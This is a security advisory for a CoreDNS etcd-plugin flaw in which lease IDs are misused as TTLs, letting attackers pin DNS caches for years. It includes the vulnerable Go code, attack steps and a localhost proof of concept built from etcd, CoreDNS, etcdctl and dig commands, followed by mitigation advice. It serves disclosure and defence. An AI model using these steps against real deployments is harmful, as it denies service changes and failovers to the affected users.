# CoreDNS: DNS Cache Pinning via etcd Lease ID Confusion

**GHSA**: GHSA-93mf-426m-g6x9 | **CVE**: CVE-2025-58063 | **Severity**: high (CVSS 7.1)

**CWE**: CWE-681

**Affected Packages**:
- **github.com/coredns/coredns** (go): >= 1.2.0, < 1.12.4

## Description

# Summary

The CoreDNS etcd plugin contains a TTL confusion vulnerability where lease IDs are incorrectly used as TTL values, enabling cache pinning for very long periods. This can effectively cause a denial of service for DNS updates/changes to affected services.

# Details

In `plugin/etcd/etcd.go`, the `TTL()` function casts the 64-bit etcd lease ID to a uint32 and uses it as the TTL:

```go
func (e *Etcd) TTL(kv *mvccpb.KeyValue, serv *msg.Service) uint32 {
    etcdTTL := uint32(kv.Lease)  // BUG: Lease ID != TTL duration
    // ... rest of function uses etcdTTL as actual TTL
}
```

Lease IDs are identifiers, not durations. Large lease IDs can produce very large TTLs after truncation, causing downstream resolvers and clients to cache answers for years.

This enables cache pinning attacks, such as:

1. Attacker has etcd write access (compromised service account, misconfigured RBAC/TLS, exposed etcd, insider).
2. Attacker writes/updates a key and attaches any lease (the actual lease duration is irrelevant; the ID is misused).
4. CoreDNS serves the record with an extreme TTL; downstream resolvers/clients cache it for a very long time.
5. Even after fixing/deleting the key (or restarting CoreDNS), clients continue to use the cached answer until their caches expire or enforce their own TTL caps.

Some resolvers implement TTL caps, but values and defaults vary widely and are not guaranteed.

# PoC

1. Launch etcd:

```bash
etcd \
  --data-dir ./etcd-data \
  --listen-client-urls http://127.0.0.1:2379 \
  --advertise-client-urls http://127.0.0.1:2379 \
  --listen-peer-urls http://127.0.0.1:2380 \
  --initial-advertise-peer-urls http://127.0.0.1:2380 \
  --initial-cluster default=http://127.0.0.1:2380 \
  --name default \
  --initial-cluster-token etcd-ttl-poc \
  --initial-cluster-state new &
```

2. Prepare CoreDNS configuration:

```bash
cat > Corefile << 'EOF'
skydns.local {
    etcd {
        path /skydns
        endpoint http://localhost:2379
        debug
    }
    log
    errors
}
EOF
```

3. Launch CoreDNS:

```bash
coredns -conf Corefile -dns.port=1053
```

4. Create an etcd record called `large-lease-service` with a lease grant of 1 hour:

```bash
LEASE_ID=$(etcdctl --endpoints=http://127.0.0.1:2379 lease grant 3600 | awk '{print $2}')

etcdctl --endpoints=http://127.0.0.1:2379 put /skydns/local/skydns/large-lease-service '{
  "host": "192.168.1.101",
  "port": 8080
}' --lease=$LEASE_ID
```

7. Verify the lease details:

```bash
$ etcdctl lease timetolive $LEASE_ID
lease 7c4a98dd35b75c23 granted with TTL(3600s), remaining(3252s)
```

8. Query the DNS record and observe the record TTL at 28 years:

```bash
$ dig +noall +answer @127.0.0.1 -p 1053 large-lease-service.skydns.local A
large-lease-service.skydns.local. 901209123 IN A 192.168.1.101
```

# Impact

Affects any CoreDNS deployment using the etcd plugin for service discovery.

- Availability: High as service changes (IP rotations, failovers, rollbacks) may be ignored for extended periods by caches.
- Integrity: Low as stale/incorrect answers persist abnormally long. (Note: attacker with etcd write could already point to malicious endpoints; the bug magnifies persistence.)
- Confidentiality: None.

The bug was introduced in #1702 as part of the CoreDNS [v1.2.0 release](https://github.com/coredns/coredns/releases/tag/v1.2.0).

# Mitigation

The TTL function should utilise etcd's Lease API to determine the proper TTL for leased records. Add configurable limits for minimum and maximum TTL when passing lease records, to clamp potentially extreme TTL values set as lease grant.

# Credit

Thanks to [@thevilledev](https://github.com/thevilledev) for disclovering this vulnerability and contributing a fix.

# For more information

Please consult our [security guide](https://github.com/coredns/coredns/blob/master/.github/SECURITY.md) for more information regarding our security process.
